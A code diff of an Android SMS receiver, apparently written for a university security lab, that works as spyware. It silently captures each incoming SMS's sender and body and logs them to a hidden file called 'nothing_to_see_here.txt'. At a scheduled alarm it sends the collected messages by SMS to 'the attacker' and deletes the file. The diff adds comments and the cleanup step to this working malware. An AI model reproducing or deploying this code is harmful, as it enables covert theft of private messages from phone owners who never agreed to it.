@@ -14,15 +14,15 @@ import java.io.FileOutputStream;
 import java.io.FileReader;
 import java.io.IOException;
 
-/* Class used to listen for incoming SMS Messages */
+// Class used to listen for incoming SMS Messages and AlarmManager intents
 public class SMSReceiver extends BroadcastReceiver{
 
-    // Get the object of SmsManager
     String senderNum;
     String message;
 
     public void onReceive(Context context, Intent intent) {
 
+        //if intent received is for SMS
         if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
 
             // Retrieves a map of extended data from the intent.
@@ -30,30 +30,32 @@ public class SMSReceiver extends BroadcastReceiver{
 
             try {
                 if (bundle != null) {
-                    //pdus = Protocol Description Unit. Used by SMS btw.
-
-                    //Why cast bundle.get as Object[] you say?
-                    //Well:
 
                    /*
+                    *  To Andrei: Why cast bundle.get as Object[]?
+                    *  Well:
+                    *
                     *  A PDU is a "protocol description unit", which is the industry format for an SMS message.
-                    *  Because SMSMessage reads and writes them, you shouldn't need to dissect them.
-                    *  A large message might be broken into many tiny pieces, which is why it is an array of objects.
+                    *  SMSMessage reads and writes them.
+                    *  A large message might be broken into many tiny pieces, which is why it's an array of objects.
                     */
 
                     final Object[] pdusObj = (Object[]) bundle.get("pdus");
 
+                    //Go through each pdu object and compile the message out of them
                     for (Object aPdusObj : pdusObj) {
 
-                        SmsMessage currentMessage;
-                        currentMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);
+                        //currentMessage now contains all the details of the SMS message
+                        SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);
 
-                        senderNum = currentMessage.getDisplayOriginatingAddress(); //get sender num
-                        message = currentMessage.getDisplayMessageBody(); //get sender msg
+                        senderNum = currentMessage.getDisplayOriginatingAddress(); //get phone number of the sender
+                        message = currentMessage.getDisplayMessageBody(); //get the message body
 
-                        String data = "Sender Num: " + senderNum + " Message: " + message;
+                        //Put it all together in one string
+                        String data = "Sender Num: " + senderNum + " Message: " + message + " ";
 
-                        writeToFile(data, context); //Write message content to a file inside cps633.lab4_ps2_06 folder in /sdcard/Android/data
+                        //Write message to a file inside cps633.lab4_ps2_06 folder in /sdcard/Android/data
+                        writeToFile(data, context);
                     }
                 }
             } catch (Exception e) {
@@ -61,32 +63,42 @@ public class SMSReceiver extends BroadcastReceiver{
             }
         }
 
-        //This only gets called when it's 11:59:59pm on the phone
+        //If intent received is for the scheduled AlarmManager
         if(intent.getAction().equals("AlarmStuff")){
-            sendMessage(context);
+            getMessage(context);
         }
     }
 
-    private void sendMessage(Context context) {
+    //This method handles sending the SMS to the attacker at midnight
+    private void getMessage(Context context) {
         String filename = context.getExternalCacheDir().getAbsolutePath()+"/nothing_to_see_here.txt";
         String content = "";
 
+        //Create file object
         File file = new File(filename);
 
-        if(file.length() == 0 || !file.exists()) {
-            try {
-                BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
-                String line;
-                while ((line = bufferedReader.readLine()) != null) {
-                    content += line + "\n";
-                }
-                sendSMS(content); //Call sendSMS to send SMS with message content to attacker
-            } catch (IOException e) {
-                e.printStackTrace();
+        //Grab file content and save into a string
+        try {
+            BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
+            String line;
+            while ((line = bufferedReader.readLine()) != null) {
+                content += line + "\n";
             }
+            bufferedReader.close();
+
+            Log.d("sendingMessage", content);
+
+            //Call sendSMS to send SMS with message content to attacker
+            sendSMS(content);
+
+            //Delete file
+            file.getCanonicalFile().delete();
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 
+    //This method is for writing the logged messages to a file on the phone
     private void writeToFile(String data, Context context) throws IOException {
         try {
                 String baseFolder = context.getExternalCacheDir().getAbsolutePath();
@@ -106,6 +118,7 @@ public class SMSReceiver extends BroadcastReceiver{
         }
     }
 
+    //This is the general method for sending an SMS
     public static void sendSMS(String content) {
         Log.d("sendSMS", "Sending a SMS now!");
 
